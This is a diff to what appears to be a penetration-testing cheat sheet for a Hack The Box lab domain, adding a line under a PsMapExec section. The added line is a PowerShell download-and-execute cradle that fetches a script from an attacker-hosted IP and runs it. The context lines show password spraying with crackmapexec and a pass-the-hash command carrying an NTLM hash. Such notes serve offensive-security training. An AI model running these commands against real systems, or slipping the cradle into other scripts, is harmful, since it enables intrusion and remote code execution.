@@ -452,6 +452,7 @@ crackmapexec smb 10.129.144.138 -u user_list -p user_list --no-brute
 ### PsMapexec
 ```bash
 wget https://raw.githubusercontent.com/The-Viper-One/PsMapExec/main/PsMapExec.ps1
+IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.108/PsMapExec.ps1')
 
 PsMapExec -Targets All -Domain htb.local -Method SMB -Username user -Hash 9a3121977ee93af56ebd0ef4f527a35e -Command "whoami"
 ```
